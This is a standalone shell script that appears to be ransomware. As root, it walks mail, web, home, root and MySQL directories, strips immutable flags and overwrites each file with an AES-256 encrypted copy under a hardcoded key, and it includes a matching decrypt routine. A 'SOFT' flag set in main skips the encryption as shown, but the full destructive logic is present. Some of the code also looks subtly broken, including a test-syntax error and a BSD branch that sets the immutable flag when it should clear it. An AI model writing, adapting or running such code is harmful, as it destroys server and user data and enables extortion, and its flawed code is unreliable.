#!/bin/sh

# Global Vars
ERRMSG=""
OS=""
get_os() {
	if [[$(uname -s | grep Linux) != ""]]; then
		OS="linux"
	elif [[ $( uname -s | grep BSD) != "" ]]; then
		OS="bsd"
	else
		adderr "[!] NOT \"Linux\" or \"BSD\""
		EXIT
	fi
}
openfile() {
	if [ "$OS" == "linux" ]; then
		chmod +rw $1
		chattr -i $1
	fi
	if [ "$OS" == "bsd" ]; then
		chmod +rw $1
		chflags schg $1
	fi
}

adderr() {
	ERRMSG="$ERRMSG\n$1"
}

EXIT() {
	echo -e "[+] DUMPING MESSAGES:$ERRMSG\n[!] EXITING"
	exit
}

noopenssl() {
	adderr "[!] NO OPENSSL FOUND"
	EXIT
}

notroot() {
	adderr "[!] NOT ROOT"
	EXIT
}

check_req() {
	# check the requirements
	if [ "$(whoami)" != "root" ]; then
		notroot
	fi
	if [ "$(which openssl)" != "" ]; then
		echo
	else
		noopenssl
	fi
}

init() {
	KEY="PASSWORD"
}
#encrypt the file (pack = pck)
pck() {
	if [ "$SOFT" = "" ]; then
	openfile $1
	stuff=$(cat $1)
	echo "RAN" > $1
	echo -e "$stuff" | openssl aes-256-cbc -k $KEY -out $1
	if [ ! -f "$1" ]; then
		adderr "[!] FILE NOT ENCRYPTED"
		EXIT
	fi
	fi
	adderr "[+] Encrypted $i"
}
#start decrypt
dec() {
	PRIVATEKEY="private.key"
	echo -e "$KEY" > $PRIVATEKEY
}
#unpack
upk() {
	if [ "$SOFT" = "" ]; then
	openssl aes-256-cbc -d -kfile $PRIVATEKEY -in $1 -out $1.dec
	mv $1.dec $1
	fi
	adderr "[+] Decrypted $1"
}
navdir() {
#files=( $1 )
for fil in $1; do
	whitelist=".*vmware.*|.*_schema.*"
	fil=$(echo $fil | awk "!/$whitelist/") # remove anything containing vmware
	if [ -f "$fil" ]; then
		$2 $fil
	elif [ -d "$fil" ]; then
		navdir "$fil/*" "$2"
	fi
done
}
main() {
	SOFT="YES"
	check_req
	init
	targets="/etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
	for i in $targets; do
		if [ -d "$i" ]; then
			navdir "$i/*" "pck"
		fi
	done
	EXIT	
}
main
